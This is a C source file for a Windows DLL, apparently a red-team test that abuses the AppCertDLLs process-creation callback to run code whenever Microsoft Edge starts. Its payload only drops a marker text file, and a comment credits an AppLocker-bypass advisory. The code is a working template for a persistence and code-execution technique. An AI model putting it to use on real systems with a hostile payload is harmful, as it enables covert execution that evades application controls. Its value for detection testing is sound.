/*
    AppCert DLL test for ATR & Prelude Operator.
    Author: tr4cefl0w (@traceflow_)
    Credit: https://dl.packetstormsecurity.net/1703-advisories/winapplocker-bypass.txt
*/

#include <Windows.h>
#include <stdio.h>
#pragma comment(linker, "/DLL")
#ifdef _WIN64
#pragma comment(linker, "/EXPORT:CreateProcessNotify,PRIVATE")
#else
#pragma comment(linker, "/EXPORT:CreateProcessNotify=_CreateProcessNotify@8,PRIVATE")
#endif

#define STATUS_SUCCESS 0x00000000

#define PROCESS_CREATION_QUERY   1
#define PROCESS_CREATION_ALLOWED 2
#define PROCESS_CREATION_DENIED  3

// Function to execute when the DLL is loaded. Drops a text file on disk to validate execution.
int Run()
{
    AllocConsole();
    FILE* fpstdin = stdin, * fpstdout = stdout, * fpstderr = stderr;
    freopen_s(&fpstdin, "CONIN$", "r", stdin);
    freopen_s(&fpstdout, "CONOUT$", "w", stdout);
    freopen_s(&fpstderr, "CONOUT$", "w", stderr);
    printf("Running AppCert test...");

    HANDLE hFile = CreateFile(L"C:\\Users\\Public\\appcert.txt", GENERIC_WRITE, FILE_SHARE_READ,
        NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile == INVALID_HANDLE_VALUE)
    {
        printf("Error creating file: %u\n", GetLastError());
        return 1;
    }

    char msg[] = "AppCert test successful!";
    DWORD bytesWritten;
    if (!WriteFile(hFile, msg, strlen(msg), &bytesWritten, NULL))
        printf("Error writing file: %u\n", GetLastError());

    CloseHandle(hFile);

    return 0;
}

// CreateProcessNotify is a kernel callback function which monitors process creation.
NTSTATUS NTAPI CreateProcessNotify(LPCWSTR lpApplicationName, DWORD dwReason) {
    NTSTATUS ntStatus = STATUS_SUCCESS;

    switch (dwReason)
    {
    case PROCESS_CREATION_QUERY:
        /* msedge is one of the only LOLBIN I found with which this technique still works.
        cmd.exe doesn't seem to load the DLL in latest Windows 10. */
        if (!(wcscmp(L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", lpApplicationName)))
            Run(lpApplicationName);

    case PROCESS_CREATION_ALLOWED:
        break;
    case PROCESS_CREATION_DENIED:
        break;
    }

    return ntStatus;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {

    switch (fdwReason) {
    case DLL_PROCESS_ATTACH:
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}